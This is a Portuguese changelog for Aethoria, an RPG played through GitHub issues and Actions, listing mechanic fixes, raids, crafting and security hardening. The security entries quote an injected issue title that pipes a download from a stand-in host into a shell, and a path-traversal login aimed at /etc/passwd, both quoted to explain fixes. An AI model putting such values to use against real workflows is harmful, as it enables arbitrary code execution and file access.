# 📜 CHANGELOG — Aethoria: O Reino Fragmentado

Todas as mudanças notáveis são documentadas aqui.
Formato baseado em [Keep a Changelog](https://keepachangelog.com/pt-BR/1.0.0/).

---

## [3.1.0-hardening] — 2026-07-28 — Correções de segurança, persistência e mecânicas

Origem: revisão cirúrgica do repositório (segurança, desempenho, escalabilidade,
funcionalidade, UI/UX). Plano em [`docs/PLAN-v3.1-hardening.md`](docs/PLAN-v3.1-hardening.md).

### 🔴 Corrigido — crítico

- **O pipeline nunca commitou um turno.** `git add` com um pathspec inexistente
  (`rpg/raids.json`, que só nasce na primeira raid) morre com exit 128 sem stage-ar nada;
  o `|| true` mascarava, `git diff --staged --quiet` passava e o commit era pulado. Zero
  commits de "Aethoria Bot" no histórico — todo o estado de jogo do repo veio de commit
  manual local.
- **Command injection no workflow.** O título da issue era interpolado dentro de um bloco
  `run:`, então um título como `rpg:x"; curl evil | sh; #` executava código arbitrário
  num runner com `contents: write`. Agora passa por `env:` e é lido como `"$VAR"`.
- **Exploit da masmorra.** O mini-boss da sala 10 é `is_boss=True`, e `resolve_kill`
  gravava `bosses_defeated[terreno_atual]`: numa masmorra em Kragdor isso entregava a
  relíquia de Drakar e a montaria dracônica de graça.
- **`rpg:reiniciar` não reiniciava.** `action_reset` chamava `load_player()`, que relê o
  arquivo do disco — o save antigo voltava inteiro.

### 🛠️ Corrigido — mecânicas anunciadas que não funcionavam

- **14 nós defensivos eram placebo**: `def_flat` era agregado e nunca aplicado ao dano.
- **Atordoamento e queima só valiam para o Mago**: o gate era `if cls_key == "mago"`, o
  que deixava Fender Crânios (bárbaro), Prisão Óssea (necromante) e Raio Aniquilador
  (bruxo) inertes.
- **`regen`** ("+X HP por turno vivo") só era aplicado ao matar um inimigo.
- **`free_escape`** ("Fuga sempre funciona") nunca era consultado.
- **Relíquia de Vel'Moran** ("imune a 1 morte por sessão") não tinha implementação.
- **Relíquia de Drakar** não concedia os "+12 ATK" prometidos.
- **Rumor de taverna** "+15 ATK contra ele" era gravado e nunca lido.
- **`inventory`** nunca era preenchido e `RECIPES[...]["result"]` era ignorado: craftar
  Poção Superior (+120 HP) só somava +1 no contador genérico.
- **Poção Grande (15g) curava o mesmo que a Menor (8g)**.
- **Faixa de preço de -40% reputação** era inalcançável (ordem dos testes invertida).
- **Descansar e teleportar funcionavam em combate** (checavam a chave legada
  `active_monster`, singular).
- **PvP nunca achava ninguém com maiúscula no login**: o título inteiro levava `.lower()`,
  então `rpg:desafiar:xXYoungMoreXx` procurava `xxyoungmorexx.json`.
- **Level-up inflava os máximos**: `max_hp += 18 + sk["hp_max"]` ressomava o bônus da
  árvore a cada nível e `sb()` semeava `mana_max=30`, dando +40 de mana por nível sem
  skill nenhuma. Agora os máximos são derivados de classe+nível+prestígio+árvore.
- **`check_lu` subia só um nível por chamada** e não era idempotente.

### 🔒 Segurança

- Raid só pode ser inicializada a partir de issue aberta pelo bot: antes bastava o título
  casar com um World Boss para qualquer pessoa farmar recompensa.
- Pool de recompensa de raid agora é **dividido** entre participantes (cada um recebia o
  pool inteiro).
- Texto de jogador é escapado antes de entrar no README (`rpg:mensagem:` e o eco de ação
  inválida permitiam injetar link/HTML no perfil público).
- Login validado contra a regra do GitHub: `rpg:desafiar:../../../etc/passwd` montava
  caminho fora de `rpg/players/`.
- `urlopen` sem timeout em 3 chamadas (travavam até o limite de 5 min do job).

### ⚡ Desempenho e escalabilidade

- `cache: pip` sem arquivo de dependência removido (fazia o step do `setup-python`
  falhar); o step inteiro saiu, já que o projeto é stdlib-only.
- `fetch-depth: 0` → `1`.
- `concurrency` group compartilhado entre `rpg.yml` e `update-projects.yml`, que escrevem
  o mesmo README; push com retry e rebase.
- Dia/noite e eventos mundiais agora derivam do **tempo** (UTC), não do contador global de
  turnos — com muitos jogadores ativos o dia virava noite em minutos.
- `raids.json` lido do disco uma vez por processo (eram 4 leituras por turno).
- `npc_memory[npc]["met"]` limitado (crescia sem limite dentro do `state.json`).

### 🎨 UI/UX e acessibilidade

- Log da jogada movido para o topo do bloco (estava abaixo de 8 tabelas).
- Ações impossíveis no contexto atual não são mais exibidas como disponíveis.
- Legenda do mapa completa (listava 14 dos 25 locais) e mapa em tabela, que alinha.
- Nós de skill desbloqueáveis viraram links clicáveis (antes exigiam decorar o ID).
- Tabelas longas em `<details>`; efeito de preço do evento mostrava "+0%" sempre.
- Tabela de raid mostrava o slug interno ("Tita de Gelo") no lugar do nome de exibição.
- `<img>` dos projetos em destaque ganhou `alt`.
- Falha do engine agora comenta na issue em vez de sumir com o turno em silêncio.

### 🧪 Qualidade

- `tests/test_engine.py`: **52 testes** em `unittest` (stdlib, zero dependências), com um
  teste de regressão por bug acima, cobertura de todas as ações despacháveis e um teste
  ponta a ponta por subprocess. `python3 -m unittest discover -s tests`.
- `migrate_player()` normaliza saves antigos e aplica clamp de sanidade.
- Higiene de dados: saves de teste removidos do perfil público, `max_hp: 10035` no nível 5
  corrigido para 202, crédito de chefão inválido e a conquista dele revogados.

---

## [3.4.0] — 2026 — Dungeons Cooperativas (Raids)

### ✨ Adicionado
- **Sistema de Raids Cooperativas**: Múltiplos jogadores atacam World Bosses juntos via Issues `[RAID]`
- **Criação Manual de Raids**: Comando `rpg:criar_raid:<slug>` cria Issue `[RAID]` automaticamente (nível 5+)
- **Auto-Spawn de Raids**: A cada 30 turnos, se não há raids ativas, uma é criada automaticamente pelo sistema
- **2 World Bosses**: 🥶 Titã de Gelo Ancestral (1000 HP) e 🌋 Azazel, O Destruidor (2500 HP)
- **Sistema MVP**: Jogador com maior dano total recebe +50% de recompensas
- **HP Escalonado**: Boss ganha HP extra por nível de cada participante que entra
- **4 Conquistas de Raid**: 🔥 Raider · 🌟 MVP da Raid · ⚔️ Veterano de Raids · 👑 Matador de Titãs
- **World Log para Raids**: Eventos de criação, entrada e derrota notificam todos os jogadores
- **Raids no Pre-Class Block**: Jogadores sem classe veem raids ativas como hook social
- **Issue Template**: `criar_raid.yml` com dropdown para escolha de boss
- **Documentação SETUP.md**: Seção completa de Raids com mecânicas, slugs e conquistas

### 🛠️ Corrigido
- **Boss Key Lookup**: Normalização de acentos via `unicodedata` (antes falhava com caracteres especiais)
- **Validação de Classe**: Jogadores sem classe não podem mais entrar em raids (antes causava crash)
- **Reward Math**: Removida multiplicação/divisão redundante que confundia a leitura
- **Cleanup Automático**: Raids derrotadas são removidas após 24h (antes ficavam para sempre)

---

## [3.0.0] — 2026

### ✨ Adicionado
- **Chefões Multi-fase**: Vel'Krath (2 fases), Malachar (3 fases), Drakar (3 fases), Xal'thar (3 fases) — cada fase com diálogo épico e ATK aumentado
- **Eventos Mundiais**: 7 eventos rotativos (cada 15 turnos) que afetam HP de monstros, taxa de encontros, XP ganho e preços da loja
- **Sistema de Crafting**: 3 receitas (Poção Superior, Elixir de Wyrd, Pó de Relíquias) com ingredientes combinados do inventário
- **Relíquias**: Drops únicos de cada chefão com passivos permanentes (Espírito de Vel'Moran, Coroa de Malachar, Escama de Drakar, Olho de Xal'thar)
- **Sistema de Prestígio**: Ao atingir nível 10, reinicia o nível em troca de bônus permanentes e badge especial — pontuação no leaderboard +500
- **Montaria Dracônica**: Após derrotar Drakar, desbloqueia `rpg:montar:DESTINO` para teleporte entre zonas seguras
- **Economia por Facção**: Preços variam de -20% a +40% dependendo da reputação com Ordem do Aço, Círculo Verdante e Pacto das Sombras
- **Sistema de Taverna**: `rpg:taverna` em zonas seguras oferece rumores únicos, hints de lore e recompensas aleatórias
- **NPCs com Memória v2**: Diálogos agora verificam prestígio, todos os chefões derrotados e missões completadas
- **Sistema de Veneno**: Stacks que causam dano por turno — curáveis com Antídoto
- **PvP Fantasma**: `rpg:desafiar:USERNAME` compara poder e registra vitória/derrota
- **5ª Missão**: "O Deus Esquecido" — enfrente Xal'thar nas Ilhas do Exílio
- **17 Conquistas**: Novo sistema expandido incluindo Artesão, Gladiador, Cavaleiro Dracônico e Transcendente
- **Antídoto**: Item de loja que cura todos os stacks de veneno
- **Issue Template**: Template pré-formatado para facilitar ações no jogo
- **Skip de Bots**: Engine ignora automaticamente usuários `[bot]`
- **Cache Python**: Workflow agora cacheia o ambiente Python, economizando ~20s por execução
- **Timeout de Action**: 5 minutos máximo para evitar runs travadas

### 🔄 Modificado
- Workflow com `concurrency: cancel-in-progress: false` — fila sequencial rigorosa
- Leaderboard expandido: pontuação agora inclui prestígio×500
- Skill tree com bônus de Chamar da Matilha aumentado de 30% para 35%
- Boss XP rebalanceado para encorajar desafios

### 🐛 Corrigido
- `profile_bonuses` agora armazenado como lista (compatível com engine v3)
- Cálculo de `sb()` (skill bonuses) com melhor tratamento de bool vs int
- Death reset não mais destrói o estado do companheiro

---

## [2.0.0] — 2026

### ✨ Adicionado
- **Save por usuário**: `rpg/players/{username}.json` — save individual para cada visitante
- **GitHub Profile Integration**: Busca automática do perfil GitHub do novo jogador via API REST
- **Bônus por métricas GitHub**: Stars → ouro, seguidores → XP, linguagem → afinidade de classe
- **Leaderboard Top 20**: Ranking global atualizado automaticamente a cada jogada
- **Árvore de Habilidades**: 6 skills por classe (3 ramos × 2 tiers) com pré-requisitos
- **Companheira Lyra Moonwhisper**: Arqueira élfica que se junta após a Missão 1
- **4 NPCs com Memória**: Miriel, Aldric, Oráculo e Capitão Heron com diálogos contextuais
- **Log global** de eventos do mundo compartilhado entre jogadores
- **Esquiva** (Ladino), **Regeneração** (Caçador), **Berserker** (Guerreiro) e **Atordoamento** (Mago)
- **Sistema de Conquistas v1**: 10 achievements

### 🔄 Modificado
- Workflow refatorado com `concurrency` group
- Engine modularizado em funções menores e testáveis

---

## [1.0.0] — 2025

### ✨ Adicionado
- Engine RPG inicial em Python
- Mapa 5×5 com 25 locais únicos
- 4 classes jogáveis
- Sistema de combate básico (HP/ATK/DEF/Mana)
- 4 chefões (fase única)
- 3 missões
- Sistema de XP e levels (1-10)
- README renderizado automaticamente via GitHub Actions
- Animação Snake de contribuições
